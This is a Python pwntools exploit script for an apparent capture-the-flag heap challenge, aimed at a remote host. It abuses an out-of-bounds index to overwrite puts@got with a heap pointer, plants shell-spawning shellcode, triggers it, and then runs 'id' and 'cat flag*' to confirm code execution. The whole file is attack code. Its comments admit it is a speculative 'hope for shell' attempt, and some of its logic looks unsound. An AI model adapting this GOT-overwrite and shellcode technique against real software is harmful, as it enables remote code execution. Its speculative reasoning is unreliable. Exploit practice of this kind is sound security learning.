#!/usr/bin/env python3
"""
Final systematic attempt combining all techniques
"""
from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Final systematic exploit attempt")

# Since libc leak via printf is impossible (null bytes),
# let's try getting shell WITHOUT knowing exact libc addresses

# Strategy: Use OOB write + tcache poisoning to:
# 1. Write heap pointers to strategic locations
# 2. Create overlapping/corrupted heap state
# 3. Overwrite function pointers or GOT entries
# 4. Hope for shell

info("Phase 1: Setup heap with /bin/sh")
create(0, 0x100, b'/bin/sh\x00' + b'A' * 0xf8)

info("Phase 2: Use OOB write to corrupt GOT area")
# notes[-21] = puts@got (0x3f98)
# notes[-22] = free@got (0x3f90)

# When we do create(-21, size, data):
# It writes malloc(size) to puts@got
# This OVERWRITES puts@got with a heap address!

# Then if puts is called, it will jump to heap - potential RCE!

# Write shellcode or ROP to heap
shellcode = asm(shellcraft.sh())
create(1, 0x200, shellcode + b'\x90' * (0x200 - len(shellcode)))

# Overwrite puts@got with heap address (of chunk 1)
create(-21, 0x50, b'CORRUPT')

success("Overwrote puts@got!")

info("Phase 3: Trigger puts() call")
# The program calls puts() at line 13, 14, 15
# But we've already passed those...
# We need to trigger another puts call

# Actually, when the program exits (goto done), it calls:
# puts("goodbye...");  <- This will jump to our shellcode!

info("Triggering exit...")
io.sendline(b'999')  # Invalid operation
io.sendline(b'0')

time.sleep(1)

# Check for shell
try:
    io.sendline(b'id')
    io.sendline(b'cat flag*')
    time.sleep(2)
    output = io.recvall(timeout=3)

    if b'{' in output or b'uid=' in output:
        success(f"\n{'='*60}\nSUCCESS!\n{output}\n{'='*60}")
    else:
        info(f"Output: {output}")
except:
    pass

io.interactive()
